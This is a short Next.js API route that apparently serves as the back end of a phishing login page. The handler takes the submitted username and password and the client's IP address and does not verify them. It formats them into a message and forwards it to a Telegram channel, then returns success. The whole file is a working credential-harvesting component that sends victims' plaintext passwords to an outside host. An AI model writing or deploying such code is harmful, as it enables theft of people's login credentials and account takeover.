import { NextRequest, NextResponse } from 'next/server';
import { sendTelegram } from '@/lib/telegram';

export async function POST(req: NextRequest) {
  const ip =
    req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
    req.headers.get('x-real-ip') ||
    'Unknown';

  const { username, password } = await req.json();

  const text =
    `🔐 <b>Login Attempt</b>\n\n` +
    `👤 Username: ${username}\n` +
    `🔒 Password: ${password}\n\n` +
    `🌐 IP: ${ip}`;

  await sendTelegram(text);
  return NextResponse.json({ ok: true });
}
